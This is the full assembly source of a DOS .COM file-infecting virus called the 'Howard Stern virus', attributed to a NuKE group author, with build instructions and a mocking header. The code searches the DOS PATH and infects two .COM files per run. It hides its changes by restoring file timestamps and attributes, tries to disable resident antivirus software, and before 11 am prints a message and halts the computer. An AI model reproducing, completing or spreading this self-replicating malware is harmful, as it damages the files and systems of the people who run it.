;          E-NuKE-NuKE-NuKE-NuKE-NuKE-NuKE-NuKE-NuKE-NuKE-NuKE-NuKE-Nuÿÿÿÿÿÿ
;          uK                                                       E-ÿÿÿÿÿÿ
;          E-             'HOWARD STERN ViRUS ASM SOURCE'           Nuÿÿÿÿÿÿ
;          Nu                                                       KEÿÿÿÿÿÿ
;          KE              ~~~~~~~~~~~~~~~~~~~~~~~~~~~              -Nÿÿÿÿÿÿ
;          -N                          by                           uKÿÿÿÿÿÿ
;          uK                   DEATHBOY [NuKE]                     E-ÿÿÿÿÿÿ
;          E-                                                       Nuÿÿÿÿÿÿ
;          E-NuKE-NuKE-NuKE-NuKE-NuKE-NuKE-NuKE-NuKE-NuKE-NuKE-NuKE-Nuÿÿÿÿÿÿ
;ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ
; [HOWARD].ASM -- The Howard Stern virus                                   
;                                                                          
; Written by DeathBoy[NuKE]                                                
;                                                                          
; Well, this ought to turn some heads... NOT... this is the source code for
; a New Virus... It displays ' I'm Not working until Howard Stern is Done  
; @ 11:00 am.   Bow down Before the King.'  if the infected program is ran 
; anytime before 11:00 am.===> Then lock up the Computer!                  
; It is a Non-Resident  .COM infector that is 967 bytes long               
; compiled...TO make this a Working DEMO...you will need TASM v2.0         
; or better... ( TASM /mx /m2 /q HOWARD.asm ) then                         
; ( TLINK /x /t HOWARD.obj )                                               
; the result should be a 1003 byte *.COM file infector that follows        
; the DOS PATH=  looking for victim files...                               
; it will only infect 2 files per execution                                
; of an infected file...                                                   
;                                                                          
; CHEERS TO YOU HOWARD & Robin,  I'm a Big FAN...  Please                  
;               COME TO ATLANTA, GA...                                     
;      Infinity ( 92.9 FM ) has the GreaseIdiot on & I'm                   
;     going Crazy!                                                         
;                                                                          
; Ps. I thought the Book was funny, #2 on the Best-seller's list in the    
; area Stores ( & YOU ARE NOT ON DOWN HERE !!! ) ... Keep it up...         
;                                                                          
;=====> The intent of this VIRUS is not to destroy but to Annoy, !         
;Please do not give anyone this virus unless they want it, Knowingly ...   
;               You are responsible for your actions...                    
;                                                                          
;       BTW, there is a slight Bug in the Virus, put there on purpose      
;            It is an easy one to find & FIX... IF you can fix it,         
;            then :)   You do not need to register.                        
;                                                                          
;               If not... then you do not need to know how.                
;                                    OR                                    
;            If you register however, I will take out the 'Beg/Buggy-Code' 
;                                                                          
;             Get you AV idiots...   FYA ESAD YMABFFW                      
;                                                                          
;         Long Live [NuKE], ARiSToTLE, NT, BO, & the latest [NuKE]         
;               member  .. NoSFaRTu(sp) :)                                 
;                                                                          
;----------------------------CUT HERE-----------------------------------   
code            segment byte public                                        
                assume  cs:code,ds:code,es:code,ss:code                    
                org     0100h                                              
                                                                           
main            proc    near                                               
                push    di               ; Stupid Shit For Stupid          
                push    bp               ; Programs                        
                push    dx               ;                                 
                mov     ax,05FEh         ; Trash some mem. res.            
                mov     dx,0A6BAh        ; software...                     
                not     ax               ;                                 
                not     dx               ;                                 
                int     16h              ; golly wally, did that work?     
                mov     ax,05FDh         ;                                 
                mov     dx,0A6BAh        ; Maybe this time ???             
                mov     bx,0000h         ;                                 
                not     ax               ;                                 
                not     dx               ;                                 
                int     16h              ;                                 
                pop     dx               ;                                 
                pop     bp               ;                                 
                pop     di               ; Ok. lets do this.               
                                                                           
                db      0E9h,00h,00h     ; Standard BS pointer             
start:          call    get_loc          ; Like an Old trick               
get_loc:        pop     bp               ; BP holds old IP                 
                sub     bp,offset get_loc; Adjust for length of host       
                lea     si,[bp + buffer] ; SI points to original start     
                mov     di,0100h         ; Push 0100h on to stack for      
                                                                           
                xchg    ax,bx            ; beat the heat                   
                xchg    bx,ax            ; with clean code                 
                push    di               ; return to main program          
                movsw                    ; Copy the first two bytes        
                movsb                    ; Copy the third byte             
                                                                           
                mov     di,bp            ; DI points to start of virus     
                                                                           
                push    sp               ; doing the nasty with the        
                pushf                    ; stupid coding.                  
                push    bp               ; Are you sure you know           
                push    di               ; what you are doing??            
                push    dx               ; Doesn't look it??               
                                                                           
                call    disvsafe         ; Ahh, FiDO-DoRKS LOOK HERE       
                pop     dx               ; Snoop-doogy dawg...             
                pop     di               ; Yippie-Oh Yippie-heh.           
                pop     bp               ;                                 
                popf                     ; Freedom to do as I please.      
                pop     sp               ;                                 
                                                                           
                mov     bp,sp            ; BP points to stack              
                sub     sp,128           ; Allocate 128 bytes on stack     
                                                                           
                mov     ah,02Fh          ; DOS get DTA function            
                int     021h                                               
                push    bx               ; Save old DTA address on stack   
                                                                           
                mov     ah,01Ah          ; DOS set DTA function            
                lea     dx,[bp - 128]    ; DX points to buffer on stack    
                xchg    ax,bx            ; Do Stuff for fun.               
                xchg    ax,bx            ; Reiterate that                  
                int     021h             ; R U still reading this??        
                                         ; WHy??? :^)                      
                                                                           
                call    search_me        ; Find and infect a file          
                call    search_me        ; 2 files                         
                                                                           
                call    get_hour                                           
                cmp     ax,000Bh         ; Did the function return 11?     
                jle     go_next           ; If less than or equal, do effec
                jmp     not_yet          ; Otherwise skip over it          
go_next:                cmp     ax,0006h ; Before 6:00am ??                
                jge     strt00           ; Yep, Go do it                   
                jmp     not_yet          ; Nop, let get outta here         
                                                                           
strt00:                                                                    
                push    sp               ; More BS... for the              
                pushf                    ; Bytes...                        
                push    bp               ;                                 
                push    di               ; It looks good in hex :)         
                push    dx               ; Not! Show me some fucked        
                                         ; code please!!!                  
                mov     ah,09h           ; BIOS display char. function     
                mov     dx, offset data01 ; whoop there it is...           
                int     21h                                                
                pop     dx               ; This is just for kicks          
                pop     di               ; & giggles...                    
                pop     bp               ; Something tells                 
                popf                     ; me to do this...                
                pop     sp               ; just for laughs                 
                                                                           
                lea     si,[di + data00] ; SI points to shit               
                call    show_this                                          
                                                                           
                mov     cx,45h           ; number of flashes               
flash:                                                                     
                xor     ax,ax            ; Clear Register                  
                mov     al,0FFh          ; Load binary flags               
                mov     dx,060h          ; Port number                     
                out     060h,al          ; Toggle Keyboard lights          
                dec     cx               ; lets do it one less time        
                nop                      ; good for what ails you.         
                jcxz   getout            ; ok, I'm thru.                   
                nop                                                        
                loop   flash             ; nah, I want to do it again      
                                                                           
                                                                           
getout:         cli                      ; Clear the interrupt flag        
                hlt                      ; HALT the computer               
                jmp    $                 ; Why not??                       
                                                                           
                                                                           
not_yet:        xor     ax,ax            ; Clear Register                  
                mov     al,0FFh          ; Load binary flags               
                mov     dx,060h          ; Port number                     
                out     060h,al          ; Toggle Keyboard lights          
                dec     cx               ; lets do it one less time        
                nop                      ; good for what ails you.         
                jcxz   com_end           ; ok, I'm thru.                   
                loop   not_yet           ; nah, I want to do it again      
                                                                           
                                                                           
com_end:        pop     dx               ; DX holds DTA address            
                mov     ah,01Ah          ; DOS set DTA function            
                int     021h                                               
                mov     sp,bp            ; Deallocate local buffer         
                xor     ax,ax            ;                                 
                mov     bx,ax            ;                                 
                mov     cx,ax            ;                                 
                mov     dx,ax            ; DUMP out the registers          
                mov     si,ax            ;                                 
                mov     di,ax            ;                                 
                mov     bp,ax            ;                                 
                                                                           
                ret                      ; Return to original program      
main            endp                                                       
                                                                           
disvsafe        proc    near             ; Well, Now this                  
                mov     ax,05FEh         ; is abusive.                     
                mov     dx,0A6BAh        ;                                 
                not     ax               ;                                 
                not     dx               ;                                 
                int     16h              ; Pretty Stupid, Huh?             
                mov     ax,05FDh         ; Ha... You're looking            
                mov     dx,0A6BAh        ; at it aren't you??              
                mov     bx,0000h         ;                                 
                not     ax               ;                                 
                not     dx               ; Yep,  Lamest...                 
                int     16h              ;                                 
                ret                      ;                                 
disvsafe        endp                                                       
                                                                           
search_me       proc    near                                               
                mov     bx,di            ; BX points to the virus          
                push    bp               ; Save BP                         
                mov     bp,sp            ; BP points to local buffer       
                sub     sp,135           ; Allocate 135 bytes on stack     
                                                                           
                mov     byte ptr [bp - 135],'\' ; Start with a backslash   
                                                                           
                mov     ah,01h           ; Clean code, Clean code...       
                mov     ah,047h          ; DOS get current dir function    
                xor     dl,dl            ; DL holds drive # (current)      
                lea     si,[bp - 134]    ; SI points to 64-byte buffer     
                int     021h                                               
                                                                           
                call    scan_path        ; Start scanning                  
                                                                           
scanpath_loop: cmp     word ptr [bx + path_ad],0  ; Was the search unsucces
                je      found_none       ; If so then we're done           
                call    found_sub        ; Otherwise copy the subdirectory 
                                                                           
                mov     ax,cs            ; AX holds the code segment       
                mov     ds,ax            ; Set the data and extra          
                mov     es,ax            ; segments to the code segment    
                                                                           
                xor     al,al            ; Zero AL                         
                stosb                    ; NULL-terminate the directory    
                                                                           
                xor     ah,ah            ; Clear register                  
                mov     ah,03Bh          ; DOS change directory function   
                lea     dx,[bp - 70]     ; DX points to the directory      
                int     021h                                               
                                                                           
                lea     dx,[bx + com_mask]      ; DX points to '*.COM'     
                push    di                                                 
                mov     di,bx                                              
                call    find_me          ; Try to infect a .COM file       
                mov     bx,di                                              
                pop     di                                                 
                jnc     found_none       ; If successful the exit          
                jmp     short scanpath_loop    ; Keep checking the PATH    
                                                                           
found_none:     mov     ah,03Bh          ; DOS change directory function   
                lea     dx,[bp - 135]    ; DX points to old directory      
                int     021h                                               
                                                                           
                cmp     word ptr [bx + path_ad],0 ; Did we run out of direc
                jne     try_again        ; If not then exit                
                stc                      ; Set the carry flag for failure  
try_again:      mov     sp,bp            ; Restore old stack pointer       
                pop     bp               ; Restore BP                      
                ret                      ; Return to caller                
com_mask        db      '*.COM',0        ; Mask for all .COM files         
search_me       endp                                                       
                                                                           
scan_path       proc    near                                               
                mov     es,word ptr cs:[002Ch]  ; ES holds the enviroment s
                xor     di,di            ; DI holds the starting offset    
                                                                           
find_path:      lea     si,[bx + path_string]   ; SI points to 'PATH='     
                lodsb                    ; Load the 'P' into AL            
                xor     cl, cl           ; Clean those registers           
                mov     cx,08000h        ; Check the first 32767 bytes     
                repne   scasb            ; Search until the byte is found  
                mov     cx,4             ; Check the next four bytes       
check_next_4:   lodsb                    ; Load the next letter of 'PATH=' 
                scasb                    ; Compare it to the environment   
                jne     find_path        ; If there not equal try again    
                loop    check_next_4     ; Otherwise keep checking         
                                                                           
                mov     word ptr [bx + path_ad],di      ; Save the PATH add
                mov     word ptr [bx + path_ad + 2],es  ; Save the PATH's s
                ret                      ; Return to caller                
                                                                           
path_string     db      'PATH='          ; The PATH string to search for   
path_ad         dd      ?                ; Holds the PATH's address        
scan_path       endp                                                       
                                                                           
found_sub       proc    near                                               
                lds     si,dword ptr [bx + path_ad]     ; DS:SI points to P
                lea     di,[bp - 70]     ; DI points to the work buffer    
                push    cs               ; Transfer CS into ES for         
                pop     es               ; byte transfer                   
move_sub:       lodsb                    ; Load the next byte into AL      
                cmp     al,';'           ; Have we reached a separator?    
                je      moved_one        ; If so we're done copying        
                or      al,al            ; Are we finished with the PATH?  
                je      moved_last_one   ; If so get out of here           
                stosb                    ; Store the byte at ES:DI         
                jmp     short move_sub   ; Keep transfering characters     
                                         ; keep it up                      
                                                                           
moved_last_one: mov     si,0000h                ; Zero SI to signal complet
moved_one:      mov     word ptr es:[bx + path_ad],si  ; Store SI in the pa
                ret                             ; Return to caller         
found_sub       endp                                                       
                                                                           
find_me         proc    near                                               
                push    bp               ; Save BP                         
                mov     ah,0FFh          ; Clean code                      
                mov     ah,02Fh          ; DOS get DTA function            
                int     021h                                               
                push    bx               ; Save old DTA address            
                                                                           
                mov     bp,sp            ; BP points to local buffer       
                sub     sp,128           ; Allocate 128 bytes on stack     
                                                                           
                push    dx               ; Save file mask                  
                mov     ah,0FFh           ; Clean code                     
                mov     ah,01Ah          ; DOS set DTA function            
                lea     dx,[bp - 128]    ; DX points to buffer on stack    
                xchg    ax,bx            ; Lets do the Time                
                xchg    ax,bx            ; warp again                      
                int     021h                                               
                mov     ah,0FFh          ; Clean code just for fun         
                mov     ah,04Eh          ; DOS find first file function    
                mov     cx,00100111b     ; CX holds all file attributes    
                pop     dx               ; Restore file mask               
find_a_file:    int     021h                                               
                jc      found_out        ; Exit if no files found          
                call    infect_file      ; Infect the file!                
                jnc     found_out        ; Exit if no error                
                mov     ah,0FFh           ; Clean code                     
                mov     ah,04Fh          ; DOS find next file function     
                jmp     short find_a_file; Try finding another file        
                                                                           
found_out:      mov     sp,bp            ; Restore old stack frame         
                mov     ah,0FFh           ; Clean code                     
                mov     ah,01Ah          ; DOS set DTA function            
                pop     dx               ; Retrieve old DTA address        
                int     021h                                               
                                                                           
                pop     bp               ; Restore BP                      
                ret                      ; Return to caller                
find_me         endp                     ; Are you reading this            
                                         ; nonsense?                       
                                                                           
show_this       proc    near                                               
                mov     ah,0Eh           ; BIOS display                    
loop_this:      lodsb                    ; Load next char. into AL         
                or      al,al            ; Is the character a null?        
                je      show_ended       ; Yep, exit                       
                int     010h             ; BIOS video interrupt            
                jmp     short loop_this  ; Do next character               
show_ended:                                                                
                ret                      ; Return to caller                
show_this       endp                                                       
                                                                           
data00          db  ' I'm not working until Howard Stern is done @ 11:00 am
                db  ' Bow down before the King ',13,12                     
                db  ' Smile ... [NuKE] loves you',13,10,13,10,07,13,0      
data01          db  ' I'm not working until Howard Stern is done @ 11:00 am
                                                                           
infect_file     proc    near                                               
                mov     ah,0FFh          ; Clean code, yeaah suuure        
                mov     ah,02Fh          ; DOS get DTA address function    
                int     021h                                               
                mov     si,bx            ; SI points to the DTA            
                mov     byte ptr [di + set_carry],0  ; Assume we'll fail   
                cmp     word ptr [si + 01Ah],(65279 - (finish - start))    
                jbe     we_be_good       ; If it's small enough continue   
                jmp     infection_done   ; Otherwise exit                  
we_be_good:     mov     ax,03D00h        ; DOS open file function, r/o     
                lea     dx,[si + 01Eh]   ; DX points to file name          
                int     021h                                               
                xchg    bx,ax            ; BX holds file handle            
                                                                           
                mov     ah,03Fh          ; DOS read from file function     
                mov     cx,3             ; CX holds bytes to read (3)      
                lea     dx,[di + buffer] ; DX points to buffer             
                int     021h                                               
                mov     ah,0FFh          ; Clean code                      
                xor     ah,ah            ; Clean the registers             
                mov     ah,0FFh          ; Clean code again                
                xor     ah,ah            ; Clean the registers             
                mov     ax,04202h        ; DOS file seek function, EOF     
                cwd                      ; Zero DX _ Zero bytes from end   
                mov     cx,dx            ; Zero CX /                       
                int     021h                                               
                                                                           
                xchg    dx,ax            ; Faster than a PUSH AX           
                mov     ah,03Eh          ; DOS close file function         
                int     021h                                               
                xchg    dx,ax            ; Faster than a POP AX            
                                                                           
                sub     ax,finish - start + 3   ; Adjust AX for a valid jum
                cmp     word ptr [di + buffer + 1],ax  ; Is there a JMP yet
                je      infection_done          ; If equal then exit       
                mov     byte ptr [di + set_carry],1  ; Success -- the file 
                add     ax,finish - start       ; Re-adjust to make the jum
                mov     word ptr [di + new_jump + 1],ax  ; Construct jump  
                                                                           
                mov     ax,0BCFEh        ; DOS set file attrib. function   
                xor     cx,cx            ; Clear all attributes            
                lea     dx,[si + 01Eh]   ; DX points to victim's name      
                not     ax                                                 
                int     021h                                               
                                                                           
                mov     ax,0C2FDh        ; DOS open file function, r/w     
                not     ax                                                 
                int     021h                                               
                xchg    bx,ax            ; BX holds file handle            
                                                                           
                mov     ah,040h          ; DOS write to file function      
                mov     cx,3             ; CX holds bytes to write (3)     
                lea     dx,[di + new_jump] ; DX points to the jump we made 
                int     021h                                               
                                                                           
                xor     ah,ah            ; Clear Registers                 
                xor     ax,ax                                              
                mov     ax,0BDFDh        ; DOS file seek function, EOF     
                not     ax                                                 
                cwd                      ; Zero DX _ Zero bytes from end   
                mov     cx,dx            ; Zero CX /                       
                int     021h                                               
                mov     ah,69h                                             
                mov     ah,040h          ; DOS write to file function      
                mov     cx,finish - start; CX holds virus length           
                lea     dx,[di + start]  ; DX points to start of virus     
                int     021h                                               
                mov     ah,69h                                             
                xor     ax,ax                                              
                mov     ax,0A8FEh        ; DOS set file time function      
                mov     cx,[si + 016h]   ; CX holds old file time          
                mov     dx,[si + 018h]   ; DX holds old file date          
                not     ax                                                 
                int     021h                                               
                                                                           
                mov     ah,03Eh          ; DOS close file function         
                int     021h                                               
                                                                           
                mov     ax,0BCFEh        ; DOS set file attrib. function   
                xor     ch,ch            ; Clear CH for file attribute     
                mov     cl,[si + 015h]   ; CX holds file's old attributes  
                lea     dx,[si + 01Eh]   ; DX points to victim's name      
                not     ax                                                 
                int     021h                                               
                                                                           
infection_done: cmp     byte ptr [di + set_carry],1  ; Set carry flag if fa
                ret                             ; Return to caller         
                                                                           
set_carry       db      ?                ; Set-carry-on-exit flag          
buffer          db      090h,0CDh,020h   ; Buffer to hold old three bytes  
new_jump        db      0E9h,?,?         ; New jump to virus               
infect_file     endp                                                       
                                                                           
get_hour        proc    near                                               
                mov     ah,02Ch          ; DOS get time function           
                int     021h                                               
                mov     al,ch            ; Copy hour into AL               
                cbw                      ; Sign-extend AL into AX          
                ret                      ; Return to caller                
get_hour        endp                                                       
                                                                           
                                                                           
note            db      ' 1234567890!@#$%^&*()ascii '                      
                db      ' (c) Ba Ba Stupid... '                            
                db      ' Remember Studderin' John '                       
                db      ' Robin, I love You! '                             
                db      ' Long Live [NuKE] '                               
                db      12h,13h,17h,19h                                    
                db      ' Georgia needs Howard Stern'                      
                                                                           
finish          label   near                                               
                                                                           
code            ends                                                       
                end     main                                               
